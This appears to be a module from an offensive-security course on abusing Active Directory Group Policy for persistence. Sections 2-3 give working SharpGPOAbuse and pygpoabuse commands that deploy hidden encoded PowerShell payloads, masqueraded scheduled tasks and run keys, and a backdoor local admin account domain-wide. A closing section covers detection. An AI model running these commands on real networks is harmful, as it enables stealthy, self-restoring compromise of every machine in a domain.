# Group Policy Persistence

## Unit 7 - Topic 5 | Persistence

---

## Overview

**Group Policy persistence** leverages GPOs to maintain access by deploying scripts, scheduled tasks, or configuration changes that execute on every computer in the linked OU. Since GPOs are processed regularly (every 90 minutes), any persistence mechanism deployed via GPO self-repairs even if defenders clean individual machines.

---

## 1. GPO Persistence Techniques

```
GPO PERSISTENCE METHODS:

1. STARTUP/LOGON SCRIPTS
   ├── Execute on every boot (startup) or user logon
   ├── Scripts stored in SYSVOL
   ├── Run as SYSTEM (startup) or user (logon)
   └── Survive OS reinstall (GPO re-applies!)

2. SCHEDULED TASKS (IMMEDIATE)
   ├── Deploy scheduled task via GPO
   ├── Runs at specified interval
   ├── Can execute as SYSTEM
   └── GPO ensures task persists

3. REGISTRY MODIFICATIONS
   ├── Add run keys for persistence
   ├── Modify security settings
   ├── Disable security features
   └── Applied every 90 minutes

4. SOFTWARE INSTALLATION
   ├── Deploy MSI packages via GPO
   ├── Installs on all linked machines
   └── Re-installs if removed

5. LOCAL USER/GROUP MODIFICATIONS
   ├── Add backdoor user to local admins
   ├── Applied via Restricted Groups or Preferences
   └── Re-applied every GPO refresh

GPO REFRESH:
├── Background refresh: Every 90 min (±30 random)
├── DC refresh: Every 5 minutes
├── gpupdate /force: Immediate
└── Boot/Logon: Always processed
```

---

## 2. Implementing GPO Persistence

```bash
# === METHOD 1: STARTUP SCRIPT ===
# SharpGPOAbuse:
.\SharpGPOAbuse.exe --AddComputerScript \
  --ScriptName startup.bat \
  --ScriptContents "powershell -ep bypass -w hidden -e ENCODED_PAYLOAD" \
  --GPOName "Default Domain Policy"

# Manual:
# 1. Navigate to GPO script path:
#    \\corp.local\SYSVOL\corp.local\Policies\{GPO-GUID}\
#    Machine\Scripts\Startup\
# 2. Create script:
#    beacon.bat → contains reverse shell command
# 3. Link script in GPO:
#    Computer Config → Policies → Windows Settings →
#    Scripts → Startup → Add script

# === METHOD 2: SCHEDULED TASK VIA GPO ===
.\SharpGPOAbuse.exe --AddComputerTask \
  --TaskName "WindowsUpdate" \
  --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" \
  --Arguments "/c powershell -ep bypass -e PAYLOAD" \
  --GPOName "Default Domain Policy" \
  --FilterEnabled --FilterRunOnce

# === METHOD 3: ADD LOCAL ADMIN ===
.\SharpGPOAbuse.exe --AddLocalAdmin \
  --UserAccount backdoor_user \
  --GPOName "Default Domain Policy"
# Adds backdoor_user as local admin on ALL domain machines!
# Even if removed locally → GPO re-adds every 90 minutes

# === METHOD 4: REGISTRY RUN KEY ===
# Via GPO Preferences:
# Computer Config → Preferences → Windows Settings →
# Registry → New → Registry Item
# Hive: HKLM
# Path: SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# Name: WindowsUpdate
# Value: cmd /c powershell -ep bypass -e PAYLOAD
```

---

## 3. Creating a Malicious GPO

```powershell
# === CREATE NEW GPO (If you have GP Creator Owners) ===
# Step 1: Create GPO
New-GPO -Name "Security Compliance Check" -Comment "Mandatory security compliance"

# Step 2: Add startup script
$gpo = Get-GPO -Name "Security Compliance Check"
# Copy script to GPO path in SYSVOL

# Step 3: Link to target OU
New-GPLink -Name "Security Compliance Check" \
  -Target "OU=Workstations,DC=corp,DC=local"

# === PYGPOABUSE (Linux) ===
python3 pygpoabuse.py corp.local/admin:pass \
  -gpo-id "{GPO-GUID}" \
  -command "net user backdoor P@ss123! /add && net localgroup Administrators backdoor /add" \
  -dc-ip dc01 -f

# === TARGETING SPECIFIC OUs ===
# Link GPO to high-value OUs:
# "Domain Controllers" → Execute on all DCs!
# "Servers" → Execute on all servers
# "Workstations" → Execute on all workstations
# DEFAULT DOMAIN POLICY → Execute EVERYWHERE
```

---

## 4. GPO Persistence Advantages

```
WHY GPO PERSISTENCE IS POWERFUL:

1. SELF-HEALING:
   ├── Defender cleans backdoor on Host A
   ├── 90 minutes later → GPO re-applies
   ├── Backdoor is back!
   └── Must remove the GPO itself to stop

2. DOMAIN-WIDE:
   ├── Single GPO → affects hundreds/thousands of machines
   ├── New machines auto-receive the persistence
   └── Scales with the organization

3. LEGITIMATE APPEARANCE:
   ├── GPO processing is normal behavior
   ├── Scripts in SYSVOL are expected
   ├── Scheduled tasks via GPO are common
   └── Blends with enterprise management

4. DIFFICULT TO INVESTIGATE:
   ├── Defenders may check individual machines
   ├── But miss the GPO source
   ├── Re-imaging machines doesn't help
   └── Must audit all GPOs and SYSVOL

COMPARISON:
├── Service persistence: Survives reboot, single machine
├── Registry persistence: Survives reboot, single machine  
├── WMI persistence: Survives reboot, single machine
├── GPO persistence: Survives reboot, ALL machines in OU
└── GPO = enterprise-scale persistence!
```

---

## 5. Detection and Defense

| Detection | Method |
|-----------|--------|
| **GPO changes** | Event ID 5136, 5137 (directory object modified/created) |
| **Script additions** | Monitor SYSVOL for new/modified scripts |
| **GPO auditing** | Regular review of all GPO settings |
| **Startup scripts** | Audit Computer Config → Scripts → Startup |
| **Scheduled tasks** | Check GPO-deployed scheduled tasks |
| **SIEM** | Alert on GPO creation or modification by non-standard accounts |

```powershell
# === AUDIT GPOs ===
# List all GPOs and their modification dates:
Get-GPO -All | select DisplayName, ModificationTime, Owner | \
  Sort-Object ModificationTime -Descending

# Compare GPO reports:
Get-GPOReport -All -ReportType HTML -Path "C:\GPO_Audit.html"

# Check for GPO scripts:
Get-ChildItem "\\corp.local\SYSVOL\corp.local\Policies" \
  -Recurse -Include *.bat,*.ps1,*.vbs,*.cmd

# SYSVOL integrity monitoring:
# Use file integrity monitoring (FIM) on SYSVOL
# Alert on any new or modified files
```

---

## Summary Table

| Technique | Scope | Stealth | Self-Healing |
|-----------|-------|:-------:|:------------:|
| **Startup script** | All linked machines | 🟡 Medium | ✅ Yes |
| **Scheduled task** | All linked machines | 🟡 Medium | ✅ Yes |
| **Local admin add** | All linked machines | 🟡 Medium | ✅ Yes |
| **Registry key** | All linked machines | 🟢 High | ✅ Yes |
| **Software install** | All linked machines | 🟡 Medium | ✅ Yes |

---

## Quick Revision Questions

1. **Why does GPO persistence self-repair?**
2. **What is the Default Domain Policy and why is it a high-value target?**
3. **How often does background GPO refresh occur?**
4. **What tool enables GPO abuse from Linux?**
5. **How do you detect unauthorized GPO modifications?**

---

[← Previous: AdminSDHolder Abuse](04-adminsdholder-abuse.md) | [Next: DSRM Abuse →](06-dsrm-abuse.md)

---

*Unit 7 - Topic 5 of 6 | [Back to README](../README.md)*
